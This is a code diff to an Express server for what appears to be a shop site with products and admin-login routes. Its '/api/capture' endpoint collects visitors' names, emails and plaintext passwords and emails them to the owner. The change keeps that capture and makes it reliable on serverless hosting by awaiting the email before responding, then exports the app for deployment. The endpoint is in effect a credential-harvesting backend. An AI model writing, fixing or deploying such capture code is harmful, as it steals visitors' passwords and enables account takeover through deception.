@@ -159,13 +159,10 @@ app.post('/api/admin-login', (req, res) => {
 
 
 // Capture endpoint — sends visitor data to owner's email
-// Always returns 200 so the user is never blocked by email issues
+// Must await in Vercel because serverless functions freeze once a response is sent
 app.post('/api/capture', async (req, res) => {
   const { name, email, password } = req.body;
-  // Respond immediately — don't make the user wait for email
-  res.status(200).json({ success: true });
 
-  // Send email in the background (non-blocking)
   const mailOptions = {
     from: process.env.ADMIN_GMAIL,
     to: process.env.RECEIVER_GMAIL,
@@ -180,9 +177,14 @@ app.post('/api/capture', async (req, res) => {
       </table>
     `,
   };
-  transporter.sendMail(mailOptions).catch(err => {
+
+  try {
+    await transporter.sendMail(mailOptions);
+    res.status(200).json({ success: true });
+  } catch (err) {
     console.error('[Email Error]', err.message);
-  });
+    res.status(500).json({ error: 'Email failed to send' });
+  }
 });
 
 // Products API
@@ -202,3 +204,6 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
+// Export the Express app for Vercel Serverless Functions
+export default app;
